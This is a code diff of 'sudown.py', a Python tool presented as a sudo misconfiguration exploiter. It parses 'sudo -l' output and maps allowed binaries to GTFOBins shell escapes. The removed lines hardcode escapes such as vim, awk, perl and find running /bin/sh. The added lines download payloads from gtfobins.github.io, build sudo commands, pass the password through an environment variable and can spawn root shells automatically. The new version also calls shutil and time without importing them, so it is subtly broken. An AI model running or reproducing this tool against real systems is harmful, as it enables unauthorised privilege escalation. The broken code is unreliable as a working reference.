@@ -1,155 +1,199 @@
 #!/usr/bin/env python3
-
-import subprocess
+"""
+sudown.py: A sudo misconfiguration exploiter with dynamic GTFOBins integration.
+"""
+import os
+import sys
 import re
 import json
-import os
-import pty
 import argparse
-import getpass
-import shutil
-import sys
 import platform
-import pwd
+import getpass
+import logging
+import pty
+from pathlib import Path
 
-# GTFOBins lookup dictionary
-GTFOBINS = {
-    "vim": "sudo vim -c ':!/bin/sh'",
-    "less": "sudo less /etc/passwd  # then type !/bin/sh",
-    "awk": "sudo awk 'BEGIN {system(\"/bin/sh\")}'",
-    "perl": "sudo perl -e 'exec \"/bin/sh\";'",
-    "python": "sudo python -c 'import os; os.system(\"/bin/sh\")'",
-    "find": "sudo find . -exec /bin/sh \;"
-    # Add more mappings as needed
-}
+try:
+    import requests
+except ImportError:
+    print("[!] The 'requests' library is required. Install it via 'pip install requests'.")
+    sys.exit(1)
+
+CACHE_DIR = Path.home() / '.cache'
+GTFOBINS_URL = 'https://gtfobins.github.io/gtfobins.json'
+GTFOBINS_CACHE = CACHE_DIR / 'sudown_gtfobins.json'
+CACHE_TTL = 7 * 24 * 3600  # 7 days
+
+logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
 
 class SudoEntry:
-    def __init__(self, binary, args, as_user, nopasswd):
+    def __init__(self, binary, args, run_as, nopasswd):
         self.binary = binary
         self.args = args
-        self.as_user = as_user
+        self.run_as = run_as
         self.nopasswd = nopasswd
 
     def to_dict(self):
         return {
-            "binary": self.binary,
-            "args": self.args,
-            "as_user": self.as_user,
-            "nopasswd": self.nopasswd
+            'binary': self.binary,
+            'args': self.args,
+            'run_as': self.run_as,
+            'nopasswd': self.nopasswd
         }
 
-def run_sudo_l():
+
+def gather_system_info():
+    info = {
+        'host': platform.node(),
+        'os': platform.system() + ' ' + platform.release(),
+        'arch': platform.machine(),
+        'user': os.getenv('USER', 'unknown')
+    }
+    for k, v in info.items():
+        logging.info(f"{k.capitalize()}: {v}")
+    return info
+
+
+def check_requirements():
+    if not shutil.which('sudo'):
+        logging.error("sudo not found in PATH")
+        sys.exit(1)
+    if not shutil.which('sh'):
+        logging.error("/bin/sh not found in PATH")
+        sys.exit(1)
+    if not sys.stdin.isatty():
+        logging.error("This script requires an interactive TTY")
+        sys.exit(1)
+
+
+def get_sudo_list():
     try:
-        result = subprocess.run(["sudo", "-l"], capture_output=True, text=True)
-
-        if "a terminal is required to read the password" in result.stderr.lower() or \
-           "password is required" in result.stderr.lower() or \
-           "sudo: " in result.stderr.lower() and "password" in result.stderr.lower():
-            print("[!] Password required for sudo -l")
-            password = getpass.getpass("Enter your password for sudo: ")
-            result = subprocess.run(
-                ["sudo", "-S", "-l"],
-                input=password + "\n",
-                capture_output=True,
-                text=True
-            )
-            if "incorrect password" in result.stderr.lower():
-                print("[-] Incorrect password.")
-                return ""
-
-        return result.stdout
+        result = os.popen('sudo -l 2>&1').read()
     except Exception as e:
-        return str(e)
+        logging.error(f"Failed to run 'sudo -l': {e}")
+        sys.exit(1)
+    return result
 
-def parse_sudo_l(output):
+
+def parse_sudo_list(output):
     entries = []
-    pattern = re.compile(r'\(.*?\) (NOPASSWD:|PASSWD:) (.*)')
+    pattern = re.compile(r'\((?P<run_as>[^)]+)\) (?P<type>NOPASSWD:|PASSWD:) (?P<cmd>.*)')
     for line in output.splitlines():
         match = pattern.search(line)
         if match:
-            as_user = match.group(1)
-            nopasswd = match.group(2) == "NOPASSWD:"
-            command = match.group(3).strip()
-            binary = command.split()[0]
-            args = command[len(binary):].strip() if len(command.split()) > 1 else ""
-            entries.append(SudoEntry(binary, args, as_user, nopasswd))
+            run_as = match.group('run_as')
+            nopasswd = (match.group('type') == 'NOPASSWD:')
+            cmd = match.group('cmd')
+            parts = cmd.split()
+            binary = parts[0]
+            args = ' '.join(parts[1:]) if len(parts) > 1 else ''
+            entries.append(SudoEntry(binary, args, run_as, nopasswd))
     return entries
 
-def find_exploitable(entries):
-    exploits = []
-    for entry in entries:
-        bin_name = entry.binary.split("/")[-1]
-        if bin_name in GTFOBINS:
-            exploits.append({
-                "binary": entry.binary,
-                "exploit": GTFOBINS[bin_name],
-                "as_user": entry.as_user,
-                "nopasswd": entry.nopasswd
-            })
-    return exploits
 
-def spawn_shell(command):
-    print(f"[+] Executing: {command}")
+def fetch_gtfobins(update=False):
+    CACHE_DIR.mkdir(parents=True, exist_ok=True)
+    if not update and GTFOBINS_CACHE.exists():
+        mtime = GTFOBINS_CACHE.stat().st_mtime
+        if (time.time() - mtime) < CACHE_TTL:
+            with open(GTFOBINS_CACHE, 'r') as f:
+                return json.load(f)
+    # Fetch fresh
+    logging.info("Fetching GTFOBins database...")
     try:
-        os.system("stty raw -echo")
-        pty.spawn(command)
+        resp = requests.get(GTFOBINS_URL, timeout=10)
+        resp.raise_for_status()
+        data = resp.json()
+        with open(GTFOBINS_CACHE, 'w') as f:
+            json.dump(data, f)
+        return data
     except Exception as e:
-        print(f"[-] Shell spawn failed: {e}")
-    finally:
-        os.system("stty sane")
-
-def system_info():
-    print("[+] System & User Info")
-    print(f"    Hostname   : {platform.node()}")
-    print(f"    OS         : {platform.system()} {platform.release()} ({platform.version()})")
-    print(f"    Architecture: {platform.machine()}")
-    print(f"    Current User: {pwd.getpwuid(os.geteuid()).pw_name} (UID: {os.geteuid()})\n")
-
-def sanity_checks():
-    system_info()
-    print("[+] Performing environment checks...")
-    for binary in ["sudo", "/bin/sh"]:
-        if not shutil.which(binary):
-            print(f"[-] Required binary not found: {binary}")
-            sys.exit(1)
-    if not sys.stdin.isatty():
-        print("[-] Not running in an interactive terminal — may break password prompt or TTY shell.")
+        logging.error(f"Failed to fetch GTFOBins: {e}")
+        if GTFOBINS_CACHE.exists():
+            logging.info("Falling back to cached database.")
+            with open(GTFOBINS_CACHE, 'r') as f:
+                return json.load(f)
         sys.exit(1)
-    print("[+] Environment looks good!\n")
 
-def main(auto_execute=False, first_only=False, no_spawn=False):
-    sanity_checks()
-    print("[+] Running sudo -l")
-    output = run_sudo_l()
-    entries = parse_sudo_l(output)
-    print("[+] Detected sudo entries:")
-    for e in entries:
-        print("  -", e.to_dict())
 
-    print("[+] Searching for known GTFOBin exploits")
-    exploits = find_exploitable(entries)
-    for idx, exp in enumerate(exploits):
-        print(f"[!] Exploitable: {exp['binary']} as {exp['as_user']} (NOPASSWD: {exp['nopasswd']})")
-        print(f"    → Run: {exp['exploit']}")
-        if auto_execute and exp['nopasswd'] and not no_spawn:
-            spawn_shell(exp['exploit'].split())
-            if first_only:
-                break
+def build_exploits(entries, gtfobins_db, password=None):
+    results = []
+    for entry in entries:
+        name = os.path.basename(entry.binary)
+        if name not in gtfobins_db:
+            continue
+        exploits = []
+        data = gtfobins_db[name]
+        for method, payload in data.get('exploits', {}).items():
+            # payload may be str or list
+            if isinstance(payload, list):
+                for p in payload:
+                    exploits.append(p)
+            else:
+                exploits.append(payload)
+        for payload in exploits:
+            # Ensure full path usage
+            if payload.startswith(name):
+                full = payload.replace(name, entry.binary, 1)
+            else:
+                full = f"{entry.binary} {payload}"
+            if entry.nopasswd:
+                cmd = f"sudo {full}"
+            else:
+                cmd = f"echo $PASSWORD | sudo -S {full}"
+            results.append({
+                'binary': entry.binary,
+                'run_as': entry.run_as,
+                'nopasswd': entry.nopasswd,
+                'exploit': cmd
+            })
+    return results
 
-if __name__ == "__main__":
-    parser = argparse.ArgumentParser(
-        description="Sudown - Sudo Misconfiguration Exploiter",
-        epilog="""
-Examples:
-  ./sudown.py            # Discover misconfigurations and print payloads
-  ./sudown.py -a         # Auto-exploit all NOPASSWD targets
-  ./sudown.py -a -f      # Only auto-exploit the first available target
-  ./sudown.py -a -n      # Evaluate and show payloads but don't spawn shells
-        """,
-        formatter_class=argparse.RawDescriptionHelpFormatter
-    )
-    parser.add_argument("-a", "--auto", action="store_true", help="Auto-execute detected exploits")
-    parser.add_argument("-f", "--first", action="store_true", help="Only auto-exploit the first target")
-    parser.add_argument("-n", "--no-spawn", action="store_true", help="Print exploits but skip execution")
+
+def spawn_shell(command_str):
+    logging.info(f"Spawning shell with: {command_str}")
+    pty.spawn(['/bin/sh', '-c', command_str])
+
+
+def main():
+    parser = argparse.ArgumentParser(description="Sudo misconfiguration exploiter with GTFOBins integration.")
+    parser.add_argument('-a', '--auto', action='store_true', help='Automatically spawn shell for NOPASSWD exploits')
+    parser.add_argument('-f', '--first', action='store_true', help='Stop after first exploit')
+    parser.add_argument('-n', '--no-spawn', action='store_true', help='Do not spawn any shells')
+    parser.add_argument('-u', '--update-db', action='store_true', help='Fetch latest GTFOBins database')
+    parser.add_argument('-j', '--json', action='store_true', help='Output results as JSON')
     args = parser.parse_args()
-    main(auto_execute=args.auto, first_only=args.first, no_spawn=args.no_spawn)
+
+    try:
+        gather_system_info()
+        entries = parse_sudo_list(get_sudo_list())
+        if not entries:
+            logging.warning("No sudo entries found.")
+            return
+        pwd = None
+        if any(not e.nopasswd for e in entries):
+            pwd = getpass.getpass('Sudo password (for PASSWD entries): ')
+            os.environ['PASSWORD'] = pwd
+        gtfobins_db = fetch_gtfobins(update=args.update_db)
+        exploits = build_exploits(entries, gtfobins_db, password=pwd)
+
+        if args.json:
+            print(json.dumps(exploits, indent=2))
+            return
+
+        count = 0
+        for exp in exploits:
+            print(f"[*] {exp['exploit']}")
+            count += 1
+            if args.auto and exp['nopasswd'] and not args.no_spawn:
+                spawn_shell(exp['exploit'])
+            if args.first and count >= 1:
+                break
+        if count == 0:
+            logging.info("No exploitable entries found in GTFOBins database.")
+    except KeyboardInterrupt:
+        logging.info("Interrupted by user.")
+        sys.exit(0)
+
+if __name__ == '__main__':
+    main()
